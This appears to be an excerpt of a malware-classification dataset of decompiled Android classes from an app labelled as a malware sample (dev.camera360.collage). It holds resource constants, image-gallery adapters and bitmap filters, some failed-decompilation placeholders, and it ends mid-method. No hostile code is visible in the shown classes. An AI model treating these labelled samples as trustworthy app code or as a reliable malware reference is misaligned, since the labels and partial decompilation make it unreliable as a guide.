"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\raw.code","public static final class raw {   public static final int changelog_eng=0x7f050000;   public static final int help_eng=0x7f050001;   public static final int help_thai=0x7f050002;   public static final int new_quotes=0x7f050003;   public static final int popular_quotes=0x7f050004; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\s.code","public class s extends BaseAdapter {   File[] a;   boolean c;   public int f;   Dialog g;   int j;   int k;   int l;   private o[] n;   private Context o;   private a p;   public String b=String.valueOf(Environment.getExternalStorageDirectory().getAbsolutePath()) + ""/"" + BaseActivity.PARENT_FOLDER3+ ""/album/"";   public int d=0;   public int e=0;   boolean h=false;   boolean i=false;   ArrayList<String> m=new ArrayList<>();   private boolean c(){     DisplayMetrics displayMetrics=this.o.getResources().getDisplayMetrics();     return displayMetrics.heightPixels >= 728 && displayMetrics.widthPixels >= 728;   }   public s(  Context context,  int i,  int i2,  boolean z,  Dialog dialog){     this.c=false;     this.f=1;     this.k=100;     this.l=130;     this.g=dialog;     this.o=context;     this.j=i;     this.f=i2;     this.c=z;     if (c()) {       this.k=AdException.INTERNAL_ERROR;       this.l=260;     }     a();   }   public void a(){     File file=new File(this.b);     if (file.exists()) {       this.a=file.listFiles();       if (this.a != null && this.a.length > 1) {         Arrays.sort(this.a,new Comparator<File>(){           @Override public int compare(          File file2,          File file3){             if (file2.lastModified() < file3.lastModified()) {               return 1;             }             if (file2.lastModified() == file3.lastModified()) {               return 0;             }             return -1;           }         } );       }     }     this.d=this.a.length;     this.e=(int)Math.ceil(this.d / 12.0f);     int i=(this.f - 1) * 12;     int i2=i + 12;     if (i2 > this.d) {       i2=this.d;     }     this.n=new o[i2 - i];     int i3=0;     while (i < i2) {       this.n[i3]=new o();       this.n[i3].c=this.a[i].getName();       i3++;       i++;     }     this.p=new a(this,null);     this.p.execute(this.n);   }   @Override public int getCount(){     return this.n.length;   }   @Override public Object getItem(  int i){     return this.n[i].c;   }   @Override public long getItemId(  int i){     return i;   }   @Override public View getView(  int i,  View view,  ViewGroup viewGroup){     ImageView imageView;     o oVar=this.n[i];     if (view == null) {       imageView=new ImageView(this.o);       imageView.setLayoutParams(new AbsListView.LayoutParams(this.k,this.l));     }  else {       imageView=(ImageView)view;     }     if (oVar.e != null) {       imageView.setScaleType(ImageView.ScaleType.FIT_CENTER);       imageView.setImageBitmap(oVar.e);     }     imageView.setTag(oVar.c);     return imageView;   }   public void d(){     notifyDataSetChanged();   }   public Bitmap a(  String str){     BitmapFactory.Options options=new BitmapFactory.Options();     options.inSampleSize=4;     options.inDither=false;     options.inPurgeable=true;     options.inInputShareable=true;     options.inTempStorage=new byte[16384];     try {       File file=new File(this.b,str);       if (!file.exists()) {         return null;       }       return BitmapFactory.decodeFile(file.toString(),options);     }  catch (    Exception e) {       return null;     }   } public class a extends AsyncTask<o,Void,Void> {     private a(){     }     a(    s sVar,    a aVar){       this();     }     @Override public Void doInBackground(    o... oVarArr){       for (      o oVar : oVarArr) {         if (isCancelled()) {           break;         }         oVar.e=s.this.a(oVar.c);         oVar.d=oVar.c;         publishProgress(new Void[0]);       }       return null;     }     @Override public void onProgressUpdate(    Void... voidArr){       s.this.d();     }     @Override public void onPostExecute(    Void r3){       if ((s.this.g instanceof ah) && s.this.c) {         ((ah)s.this.g).b(s.this.e);       }     }   }   public void b(){     if (this.p != null && this.p.getStatus() != AsyncTask.Status.FINISHED) {       this.p.cancel(true);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\SettingActivity.code","!org.eclipse.jdt.core.dom.TypeDeclaration@352e5161"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\string.code","public static final class string {   public static final int action_settings=0x7f0b0003;   public static final int activity_browser=0x7f0b0068;   public static final int activity_preference=0x7f0b0067;   public static final int all_wifi=0x7f0b004b;   public static final int app_logo_bottom=0x7f0b0016;   public static final int app_logo_top=0x7f0b0015;   public static final int app_name=0x7f0b0011;   public static final int app_version_info=0x7f0b0017;   public static final int brush=0x7f0b0006;   public static final int button_browse=0x7f0b005e;   public static final int button_cancel=0x7f0b0059;   public static final int button_clear=0x7f0b0058;   public static final int button_close=0x7f0b005b;   public static final int button_help_eng=0x7f0b0050;   public static final int button_help_thai=0x7f0b0051;   public static final int button_no=0x7f0b005c;   public static final int button_ok=0x7f0b0056;   public static final int button_save=0x7f0b0057;   public static final int button_search=0x7f0b005d;   public static final int button_yes=0x7f0b005a;   public static final int color=0x7f0b0007;   public static final int dialog_help_eng=0x7f0b004e;   public static final int dialog_help_thai=0x7f0b004f;   public static final int erase=0x7f0b0008;   public static final int exit=0x7f0b0096;   public static final int gender_female=0x7f0b0091;   public static final int gender_male=0x7f0b0090;   public static final int gender_neutral=0x7f0b0092;   public static final int hello_world=0x7f0b0004;   public static final int help=0x7f0b0014;   public static final int known_wifi=0x7f0b004d;   public static final int lrg=0x7f0b000e;   public static final int lrgest=0x7f0b000f;   public static final int med=0x7f0b000d;   public static final int menu=0x7f0b002b;   public static final int menu_add_instant=0x7f0b0031;   public static final int menu_addbookmark=0x7f0b0049;   public static final int menu_back=0x7f0b003b;   public static final int menu_browse=0x7f0b0030;   public static final int menu_cancel=0x7f0b0038;   public static final int menu_capture=0x7f0b002a;   public static final int menu_copy=0x7f0b001e;   public static final int menu_current=0x7f0b002f;   public static final int menu_delete_bookmark=0x7f0b0027;   public static final int menu_delete_image=0x7f0b0053;   public static final int menu_design=0x7f0b00a0;   public static final int menu_disable=0x7f0b0033;   public static final int menu_dismiss=0x7f0b0041;   public static final int menu_download=0x7f0b0045;   public static final int menu_enable=0x7f0b0032;   public static final int menu_exit=0x7f0b003c;   public static final int menu_gallery=0x7f0b0052;   public static final int menu_go_to=0x7f0b0043;   public static final int menu_goto=0x7f0b0042;   public static final int menu_help=0x7f0b0035;   public static final int menu_help_eng=0x7f0b0036;   public static final int menu_help_thai=0x7f0b0037;   public static final int menu_howto1=0x7f0b0022;   public static final int menu_howto2=0x7f0b001f;   public static final int menu_howto3=0x7f0b0020;   public static final int menu_howto4=0x7f0b0021;   public static final int menu_item_help=0x7f0b003f;   public static final int menu_item_play=0x7f0b003d;   public static final int menu_item_scores=0x7f0b003e;   public static final int menu_item_settings=0x7f0b002c;   public static final int menu_more_app=0x7f0b0040;   public static final int menu_more_program=0x7f0b0018;   public static final int menu_moreapp=0x7f0b0024;   public static final int menu_preference=0x7f0b003a;   public static final int menu_rateapp=0x7f0b0023;   public static final int menu_refresh=0x7f0b002d;   public static final int menu_reload=0x7f0b0044;   public static final int menu_remove=0x7f0b0034;   public static final int menu_reset=0x7f0b0029;   public static final int menu_search=0x7f0b0028;   public static final int menu_search_site=0x7f0b0047;   public static final int menu_settings=0x7f0b0046;   public static final int menu_share=0x7f0b0055;   public static final int menu_smart_actions=0x7f0b0048;   public static final int menu_toggle_bookmark=0x7f0b002e;   public static final int menu_update_bookmark=0x7f0b004a;   public static final int menu_update_thumbnail=0x7f0b0010;   public static final int menu_view_gallery=0x7f0b0025;   public static final int menu_view_list=0x7f0b0026;   public static final int menu_wallpaper=0x7f0b009e;   public static final int menu_wifi_setting=0x7f0b0039;   public static final int menu_zoom=0x7f0b009f;   public static final int message_18_older=0x7f0b006c;   public static final int message_18_older_title=0x7f0b006b;   public static final int message_ads_not_complete=0x7f0b0074;   public static final int message_filter_keyword=0x7f0b006e;   public static final int message_minimum_level=0x7f0b006d;   public static final int message_no_thumbnail=0x7f0b0075;   public static final int message_wifi_required=0x7f0b0069;   public static final int message_wifi_required_title=0x7f0b006a;   public static final int no=0x7f0b0094;   public static final int no_questions=0x7f0b0095;   public static final int no_scores=0x7f0b0076;   public static final int paint=0x7f0b000a;   public static final int picture_frame=0x7f0b00a1;   public static final int pref_auto_update=0x7f0b005f;   public static final int pref_min_level=0x7f0b0061;   public static final int pref_ssid_filter1=0x7f0b0062;   public static final int pref_ssid_filter2=0x7f0b0063;   public static final int pref_ssid_filter3=0x7f0b0064;   public static final int pref_ssid_filter4=0x7f0b0065;   public static final int pref_ssid_filter5=0x7f0b0066;   public static final int pref_update_freq=0x7f0b0060;   public static final int progress_dialog_init=0x7f0b006f;   public static final int progress_dialog_saving_image=0x7f0b0073;   public static final int progress_dialog_setting_wallpaper=0x7f0b0070;   public static final int progress_dialog_sharing_gif=0x7f0b0072;   public static final int progress_dialog_sharing_image=0x7f0b0071;   public static final int rank=0x7f0b0078;   public static final int save=0x7f0b0009;   public static final int score=0x7f0b0079;   public static final int scores=0x7f0b0013;   public static final int secured_wifi=0x7f0b004c;   public static final int settings=0x7f0b007c;   public static final int settings_bg_color_confirm=0x7f0b0000;   public static final int settings_bg_color_dialog=0x7f0b0002;   public static final int settings_button_dob=0x7f0b0081;   public static final int settings_button_favoriteplace=0x7f0b0087;   public static final int settings_button_favplace_map=0x7f0b008b;   public static final int settings_button_friend_email=0x7f0b009a;   public static final int settings_button_pwd=0x7f0b0082;   public static final int settings_default_color_confirm=0x7f0b0001;   public static final int settings_dob=0x7f0b007f;   public static final int settings_dob_not_set=0x7f0b0080;   public static final int settings_email=0x7f0b007e;   public static final int settings_favoriteplace=0x7f0b0086;   public static final int settings_favoriteplace_not_set=0x7f0b0088;   public static final int settings_favplace_coords=0x7f0b0089;   public static final int settings_favplace_currentlocation=0x7f0b008a;   public static final int settings_friend_email=0x7f0b0097;   public static final int settings_friend_email_label=0x7f0b0098;   public static final int settings_friend_email_tip=0x7f0b0099;   public static final int settings_gender=0x7f0b0083;   public static final int settings_nickname=0x7f0b007d;   public static final int settings_password=0x7f0b0084;   public static final int settings_password2=0x7f0b0085;   public static final int settings_pwd_equal=0x7f0b008f;   public static final int settings_pwd_not_equal=0x7f0b008e;   public static final int settings_pwd_not_set=0x7f0b008d;   public static final int settings_pwd_set=0x7f0b008c;   public static final int sml=0x7f0b000b;   public static final int smlest=0x7f0b000c;   public static final int splash=0x7f0b0012;   public static final int start_new=0x7f0b0005;   public static final int tab_bookmark=0x7f0b001c;   public static final int tab_history=0x7f0b001d;   public static final int tab_media_search=0x7f0b001b;   public static final int tab_search=0x7f0b0019;   public static final int tab_software_search=0x7f0b001a;   public static final int title_dialog_alert=0x7f0b009b;   public static final int title_dialog_confirm=0x7f0b009c;   public static final int title_dialog_prompt=0x7f0b009d;   public static final int title_warning=0x7f0b0054;   public static final int username=0x7f0b0077;   public static final int wait_msg=0x7f0b007a;   public static final int wait_title=0x7f0b007b;   public static final int yes=0x7f0b0093; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\style.code","public static final class style {   public static final int AppBaseTheme=0x7f0c0003;   public static final int AppTheme=0x7f0c0004;   public static final int DialogAnimation=0x7f0c0005;   public static final int DialogSlideAnim=0x7f0c0006;   public static final int Dialog_Fullscreen=0x7f0c0001;   public static final int Dialog_Translucent=0x7f0c0002;   public static final int FormTheme=0x7f0c0000;   public static final int Widget_GifMoviewView=0x7f0c0007; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\styleable.code","public static final class styleable {   public static final int AdView_animation=0x00000002;   public static final int AdView_banner_type=0x00000001;   public static final int AdView_canShowMR=0x00000004;   public static final int AdView_placementType=0x00000003;   public static final int AdView_test_mode=0x00000000;   public static final int CustomTheme_gifMoviewViewStyle=0x00000000;   public static final int Gallery1_android_galleryItemBackground=0x00000000;   public static final int GifMoviewView_gif=0x00000000;   public static final int GifMoviewView_paused=0x00000001;   public static final int com_google_ads_AdView_adSize=0x00000000;   public static final int com_google_ads_AdView_adUnitId=0x00000001;   public static final int com_google_ads_AdView_keywords=0x00000002;   public static final int org_zestadz_ads_ZestadzAd_isGoneWithoutAd=0x00000001;   public static final int org_zestadz_ads_ZestadzAd_testing=0;   public static final int[] AdView={R.attr.test_mode,R.attr.banner_type,R.attr.animation,R.attr.placementType,R.attr.canShowMR};   public static final int[] CustomTheme={R.attr.gifMoviewViewStyle};   public static final int[] Gallery1={android.R.attr.galleryItemBackground};   public static final int[] GifMoviewView={R.attr.gif,R.attr.paused};   public static final int[] com_google_ads_AdView={R.attr.adSize,R.attr.adUnitId,R.attr.keywords};   public static final int[] org_zestadz_ads_ZestadzAd={R.attr.testing,R.attr.isGoneWithoutAd}; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\t.code","public class t extends ArrayAdapter<String> {   static int f;   static int g;   public String a;   public String b;   boolean c;   boolean d;   int e;   int h;   af i;   x j;   private o[] k;   private Context l;   private a m;   private int n;   private LayoutInflater o;   private void a(  Context context){     Display defaultDisplay=((WindowManager)context.getSystemService(""window"")).getDefaultDisplay();     f=defaultDisplay.getWidth();     g=defaultDisplay.getHeight();   }   public t(  Context context,  int i,  String str,  af afVar,  x xVar){     super(context,i);     this.c=false;     this.d=false;     this.e=3;     this.i=afVar;     this.j=xVar;     this.b=str;     this.l=context;     this.h=i;     TypedArray obtainStyledAttributes=context.obtainStyledAttributes(R.styleable.Gallery1);     this.n=obtainStyledAttributes.getResourceId(0,0);     obtainStyledAttributes.recycle();     this.o=(LayoutInflater)context.getSystemService(""layout_inflater"");     a(context);     a();   }   public void a(){     b();     this.m=new a(this,null);     File file=new File(this.b);     if (file.exists()) {       File[] listFiles=file.listFiles();       if (listFiles != null && listFiles.length > 1) {         Arrays.sort(listFiles,new Comparator<File>(){           @Override public int compare(          File file2,          File file3){             if (file2.lastModified() < file3.lastModified()) {               return 1;             }             if (file2.lastModified() == file3.lastModified()) {               return 0;             }             return -1;           }         } );       }       this.k=new o[listFiles.length];       int length=listFiles.length;       for (int i=0; i < length; i++) {         this.k[i]=new o();         this.k[i].c=listFiles[i].getName();       }       this.m.execute(this.k);     }   }   public void b(){     if (this.m != null && this.m.getStatus() != AsyncTask.Status.FINISHED) {       this.m.cancel(true);     }   }   @Override public int getCount(){     try {       return this.k.length;     }  catch (    Exception e) {       return 0;     }   }   @Override public String getItem(  int i){     return this.k[i].c;   }   @Override public long getItemId(  int i){     return i;   }   @Override public View getView(  int i,  View view,  ViewGroup viewGroup){     o oVar=this.k[i];     if (view == null) {       view=this.o.inflate(this.h,(ViewGroup)null);       view.setTag(new b(view));     }     b bVar=(b)view.getTag();     ImageView a2=bVar.a();     ImageButton c=bVar.c();     ProgressBar b2=bVar.b();     if (oVar.e == null) {       b2.setVisibility(0);       c.setVisibility(8);       a2.setVisibility(4);       view.setBackgroundDrawable(null);     }  else {       b2.setVisibility(8);       a2.setVisibility(0);       a2.setImageBitmap(oVar.e);       a2.setScaleType(ImageView.ScaleType.FIT_XY);       c.setVisibility(0);       view.setBackgroundColor(-1);       a2.setTag(new File(this.b,oVar.d).toString());     }     c.setTag(new as(oVar.d,oVar.e));     c.setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View view2){         try {           as asVar=(as)view2.getTag();           t.this.a=asVar.a;           AlertDialog.Builder builder=new AlertDialog.Builder(t.this.l);           builder.setTitle(""Free App Icons Icon Packs"");           builder.setMessage(""Do you want to delete Icon?"");           builder.setPositiveButton(""Yes"",new DialogInterface.OnClickListener(){             @Override public void onClick(            DialogInterface dialogInterface,            int i2){               File file=new File(t.this.b,t.this.a);               if (file.exists()) {                 file.delete();               }               t.this.a();             }           } );           builder.setNegativeButton(""Cancel"",new DialogInterface.OnClickListener(){             @Override public void onClick(            DialogInterface dialogInterface,            int i2){               dialogInterface.cancel();             }           } );           builder.show();         }  catch (        Exception e) {           e.getMessage();         }       }     } );     a2.setTag(new as(oVar.d,oVar.e));     a2.setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View view2){         try {           as asVar=(as)view2.getTag();           BitmapFactory.Options options=new BitmapFactory.Options();           options.inSampleSize=1;           options.inDither=false;           options.inPurgeable=true;           options.inInputShareable=true;           options.inTempStorage=new byte[16384];           Bitmap decodeFile=BitmapFactory.decodeFile(new File(t.this.b,asVar.a).toString(),options);           t.this.i.hide();           t.this.j.c(decodeFile,asVar.a);         }  catch (        Exception e) {         }       }     } );     return view;   }   public void c(){     notifyDataSetChanged();   }   public Bitmap a(  String str){     BitmapFactory.Options options=new BitmapFactory.Options();     options.inSampleSize=this.e;     options.inDither=false;     options.inPurgeable=true;     options.inInputShareable=true;     options.inTempStorage=new byte[16384];     try {       File file=new File(this.b,str);       if (file.exists()) {         return BitmapFactory.decodeFile(file.toString(),options);       }       return null;     }  catch (    Exception e) {       return null;     }   } private static class b {     private View a;     private ImageView b=null;     private ImageButton c=null;     private ProgressBar d=null;     public b(    View view){       this.a=view;     }     public ImageView a(){       if (this.b == null) {         this.b=(ImageView)this.a.findViewById(R.id.image_view);       }       return this.b;     }     public ProgressBar b(){       if (this.d == null) {         this.d=(ProgressBar)this.a.findViewById(R.id.progressBar1);       }       return this.d;     }     public ImageButton c(){       if (this.c == null) {         this.c=(ImageButton)this.a.findViewById(R.id.delete_button);       }       return this.c;     }   } public class a extends AsyncTask<o,Void,Void> {     private a(){     }     a(    t tVar,    a aVar){       this();     }     @Override public Void doInBackground(    o... oVarArr){       for (      o oVar : oVarArr) {         if (isCancelled()) {           break;         }         oVar.e=t.this.a(oVar.c);         oVar.d=oVar.c;         publishProgress(new Void[0]);       }       return null;     }     @Override public void onProgressUpdate(    Void... voidArr){       t.this.c();     }     @Override public void onPostExecute(    Void r1){     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\TabSample.code","!org.eclipse.jdt.core.dom.TypeDeclaration@592fbca7"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\u.code","!org.eclipse.jdt.core.dom.TypeDeclaration@432adc76"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\v.code","!org.eclipse.jdt.core.dom.TypeDeclaration@43342fd5"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\w.code","!org.eclipse.jdt.core.dom.TypeDeclaration@381667f7"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\x.code","!org.eclipse.jdt.core.dom.TypeDeclaration@4890a3c3"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\y.code","!org.eclipse.jdt.core.dom.TypeDeclaration@6536bf74"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\z.code","!org.eclipse.jdt.core.dom.TypeDeclaration@48431cf3"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage.a\a.code","public class a {   public static final int SIZE=3;   public double[][] a;   public double b=1.0d;   public double c=1.0d;   public a(  int i){     this.a=(double[][])Array.newInstance((Class<?>)Double.TYPE,i,i);   }   public void a(  double d){     for (int i=0; i < 3; i++) {       for (int i2=0; i2 < 3; i2++) {         this.a[i][i2]=d;       }     }   }   public void a(  double[][] dArr){     for (int i=0; i < 3; i++) {       for (int i2=0; i2 < 3; i2++) {         this.a[i][i2]=dArr[i][i2];       }     }   }   public static Bitmap a(  Bitmap bitmap,  a aVar){     int width=bitmap.getWidth();     int height=bitmap.getHeight();     Bitmap createBitmap=Bitmap.createBitmap(width,height,bitmap.getConfig());     int[][] iArr=(int[][])Array.newInstance((Class<?>)Integer.TYPE,3,3);     int i=0;     while (true) {       int i2=i;       if (i2 < height - 2) {         int i3=0;         while (true) {           int i4=i3;           if (i4 >= width - 2) {             break;           }           int i5=0;           while (true) {             int i6=i5;             if (i6 >= 3) {               break;             }             for (int i7=0; i7 < 3; i7++) {               iArr[i6][i7]=bitmap.getPixel(i4 + i6,i2 + i7);             }             i5=i6 + 1;           }           int alpha=Color.alpha(iArr[1][1]);           int i8=0;           int i9=0;           int i10=0;           int i11=0;           while (i9 < 3) {             int i12=i8;             int i13=i10;             int i14=i12;             for (int i15=0; i15 < 3; i15++) {               i11=(int)(i11 + (Color.red(iArr[i9][i15]) * aVar.a[i9][i15]));               i13=(int)(i13 + (Color.green(iArr[i9][i15]) * aVar.a[i9][i15]));               i14=(int)(i14 + (Color.blue(iArr[i9][i15]) * aVar.a[i9][i15]));             }             i9++;             int i16=i14;             i10=i13;             i8=i16;           }           int i17=(int)((i11 / aVar.b) + aVar.c);           if (i17 < 0) {             i17=0;           }  else           if (i17 > 255) {             i17=255;           }           int i18=(int)((i10 / aVar.b) + aVar.c);           if (i18 < 0) {             i18=0;           }  else           if (i18 > 255) {             i18=255;           }           int i19=(int)((i8 / aVar.b) + aVar.c);           if (i19 < 0) {             i19=0;           }  else           if (i19 > 255) {             i19=255;           }           createBitmap.setPixel(i4 + 1,i2 + 1,Color.argb(alpha,i17,i18,i19));           i3=i4 + 1;         }         i=i2 + 1;       }  else {         return createBitmap;       }     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage.a\b.code","public class b {   public static int a(  Resources resources,  int i){     return (int)((resources.getDisplayMetrics().density * i) + 0.5f);   }   public static void a(  File file){     if (file.exists()) {       File[] listFiles=file.listFiles();       for (int i=0; i < listFiles.length; i++) {         if (!listFiles[i].isDirectory()) {           listFiles[i].delete();         }       }     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage.a\c.code","public class c {   public static final int COLOR_MAX=255;   public static final int COLOR_MIN=0;   public static final double FULL_CIRCLE_DEGREE=360.0d;   public static final double HALF_CIRCLE_DEGREE=180.0d;   public static final double PI=3.14159d;   public static final double RANGE=256.0d;   public Bitmap a(  Bitmap bitmap){     Bitmap createBitmap=Bitmap.createBitmap(bitmap.getWidth(),bitmap.getHeight(),bitmap.getConfig());     int height=bitmap.getHeight();     int width=bitmap.getWidth();     for (int i=0; i < height; i++) {       for (int i2=0; i2 < width; i2++) {         int pixel=bitmap.getPixel(i2,i);         createBitmap.setPixel(i2,i,Color.argb(Color.alpha(pixel),255 - Color.red(pixel),255 - Color.green(pixel),255 - Color.blue(pixel)));       }     }     return createBitmap;   }   public Bitmap b(  Bitmap bitmap){     Bitmap createBitmap=Bitmap.createBitmap(bitmap.getWidth(),bitmap.getHeight(),bitmap.getConfig());     int width=bitmap.getWidth();     int height=bitmap.getHeight();     for (int i=0; i < width; i++) {       for (int i2=0; i2 < height; i2++) {         int pixel=bitmap.getPixel(i,i2);         int alpha=Color.alpha(pixel);         int green=(int)((Color.green(pixel) * 0.587d) + (0.299d * Color.red(pixel)) + (0.114d * Color.blue(pixel)));         createBitmap.setPixel(i,i2,Color.argb(alpha,green,green,green));       }     }     return createBitmap;   }   public Bitmap a(  Bitmap bitmap,  double d,  double d2,  double d3){     Bitmap createBitmap=Bitmap.createBitmap(bitmap.getWidth(),bitmap.getHeight(),bitmap.getConfig());     int width=bitmap.getWidth();     int height=bitmap.getHeight();     int[] iArr=new int[android.support.v4.view.a.a.ACTION_NEXT_AT_MOVEMENT_GRANULARITY];     int[] iArr2=new int[android.support.v4.view.a.a.ACTION_NEXT_AT_MOVEMENT_GRANULARITY];     int[] iArr3=new int[android.support.v4.view.a.a.ACTION_NEXT_AT_MOVEMENT_GRANULARITY];     for (int i=0; i < 256; i++) {       iArr[i]=Math.min(255,(int)((255.0d * Math.pow(i / 255.0d,1.0d / d)) + 0.5d));       iArr2[i]=Math.min(255,(int)((255.0d * Math.pow(i / 255.0d,1.0d / d2)) + 0.5d));       iArr3[i]=Math.min(255,(int)((255.0d * Math.pow(i / 255.0d,1.0d / d3)) + 0.5d));     }     for (int i2=0; i2 < width; i2++) {       for (int i3=0; i3 < height; i3++) {         int pixel=bitmap.getPixel(i2,i3);         createBitmap.setPixel(i2,i3,Color.argb(Color.alpha(pixel),iArr[Color.red(pixel)],iArr2[Color.green(pixel)],iArr3[Color.blue(pixel)]));       }     }     return createBitmap;   }   public Bitmap b(  Bitmap bitmap,  double d,  double d2,  double d3){     int width=bitmap.getWidth();     int height=bitmap.getHeight();     Bitmap createBitmap=Bitmap.createBitmap(width,height,bitmap.getConfig());     for (int i=0; i < width; i++) {       for (int i2=0; i2 < height; i2++) {         createBitmap.setPixel(i,i2,Color.argb(Color.alpha(bitmap.getPixel(i,i2)),(int)(Color.red(r5) * d),(int)(Color.green(r5) * d2),(int)(Color.blue(r5) * d3)));       }     }     return createBitmap;   }   public Bitmap a(  Bitmap bitmap,  int i,  double d,  double d2,  double d3){     int width=bitmap.getWidth();     int height=bitmap.getHeight();     Bitmap createBitmap=Bitmap.createBitmap(width,height,bitmap.getConfig());     for (int i2=0; i2 < width; i2++) {       for (int i3=0; i3 < height; i3++) {         int alpha=Color.alpha(bitmap.getPixel(i2,i3));         int green=(int)((Color.green(r0) * 0.59d) + (0.3d * Color.red(r0)) + (0.11d * Color.blue(r0)));         int i4=(int)(green + (i * d));         int i5=i4 > 255 ? 255 : i4;         int i6=(int)(green + (i * d2));         int i7=i6 > 255 ? 255 : i6;         int i8=(int)(green + (i * d3));         if (i8 > 255) {           i8=255;         }         createBitmap.setPixel(i2,i3,Color.argb(alpha,i5,i7,i8));       }     }     return createBitmap;   }   public Bitmap a(  Bitmap bitmap,  int i){     int width=bitmap.getWidth();     int height=bitmap.getHeight();     Bitmap createBitmap=Bitmap.createBitmap(width,height,bitmap.getConfig());     for (int i2=0; i2 < width; i2++) {       for (int i3=0; i3 < height; i3++) {         int pixel=bitmap.getPixel(i2,i3);         int alpha=Color.alpha(pixel);         int red=Color.red(pixel);         int green=Color.green(pixel);         int blue=Color.blue(pixel);         int i4=(((i / 2) + red) - ((red + (i / 2)) % i)) - 1;         if (i4 < 0) {           i4=0;         }         int i5=(((i / 2) + green) - ((green + (i / 2)) % i)) - 1;         if (i5 < 0) {           i5=0;         }         int i6=(((i / 2) + blue) - ((blue + (i / 2)) % i)) - 1;         if (i6 < 0) {           i6=0;         }         createBitmap.setPixel(i2,i3,Color.argb(alpha,i4,i5,i6));       }     }     return createBitmap;   }   public Bitmap b(  Bitmap bitmap,  int i){     int i2;     int i3;     int width=bitmap.getWidth();     int height=bitmap.getHeight();     Bitmap createBitmap=Bitmap.createBitmap(width,height,bitmap.getConfig());     for (int i4=0; i4 < width; i4++) {       for (int i5=0; i5 < height; i5++) {         int pixel=bitmap.getPixel(i4,i5);         int alpha=Color.alpha(pixel);         int red=Color.red(pixel);         int green=Color.green(pixel);         int blue=Color.blue(pixel);         int i6=red + i;         if (i6 > 255) {           i2=255;         }  else {           i2=i6 < 0 ? 0 : i6;         }         int i7=green + i;         if (i7 > 255) {           i3=255;         }  else {           i3=i7 < 0 ? 0 : i7;         }         int i8=blue + i;         if (i8 > 255) {           i8=255;         }  else         if (i8 < 0) {           i8=0;         }         createBitmap.setPixel(i4,i5,Color.argb(alpha,i2,i3,i8));       }     }     return createBitmap;   }   public Bitmap c(  Bitmap bitmap){     a aVar=new a(3);     aVar.a(new double[][]{new double[]{1.0d,2.0d,1.0d},new double[]{2.0d,4.0d,2.0d},new double[]{1.0d,2.0d,1.0d}});     aVar.b=16.0d;     aVar.c=0.0d;     return a.a(bitmap,aVar);   }   public Bitmap d(  Bitmap bitmap){     a aVar=new a(3);     aVar.a(new double[][]{new double[]{-1.0d,-1.0d,-1.0d},new double[]{-1.0d,9.0d,-1.0d},new double[]{-1.0d,-1.0d,-1.0d}});     aVar.b=1.0d;     aVar.c=0.0d;     return a.a(bitmap,aVar);   }   public Bitmap a(  Bitmap bitmap,  double d){     a aVar=new a(3);     aVar.a(1.0d);     aVar.a[1][1]=d;     aVar.b=8.0d + d;     aVar.c=1.0d;     return a.a(bitmap,aVar);   }   public Bitmap e(  Bitmap bitmap){     a aVar=new a(3);     aVar.a(new double[][]{new double[]{-1.0d,0.0d,-1.0d},new double[]{0.0d,4.0d,0.0d},new double[]{-1.0d,0.0d,-1.0d}});     aVar.b=1.0d;     aVar.c=127.0d;     return a.a(bitmap,aVar);   }   public Bitmap f(  Bitmap bitmap){     a aVar=new a(3);     aVar.a(0.0d);     aVar.a[0][0]=-2.0d;     aVar.a[1][1]=2.0d;     aVar.b=1.0d;     aVar.c=95.0d;     return a.a(bitmap,aVar);   }   public Bitmap a(  Bitmap bitmap,  int i,  float f){     int width=bitmap.getWidth();     int height=bitmap.getHeight();     Bitmap createBitmap=Bitmap.createBitmap(width,height,bitmap.getConfig());     for (int i2=0; i2 < width; i2++) {       for (int i3=0; i3 < height; i3++) {         int pixel=bitmap.getPixel(i2,i3);         int alpha=Color.alpha(pixel);         int red=Color.red(pixel);         int green=Color.green(pixel);         int blue=Color.blue(pixel);         if (i == 1) {           red=(int)(red * (1.0f + f));           if (red > 255) {             red=255;           }         }  else         if (i == 2) {           green=(int)(green * (1.0f + f));           if (green > 255) {             green=255;           }         }  else         if (i == 3 && (blue=(int)(blue * (1.0f + f))) > 255) {           blue=255;         }         createBitmap.setPixel(i2,i3,Color.argb(alpha,red,green,blue));       }     }     return createBitmap;   }   public Bitmap a(  Bitmap bitmap,  float 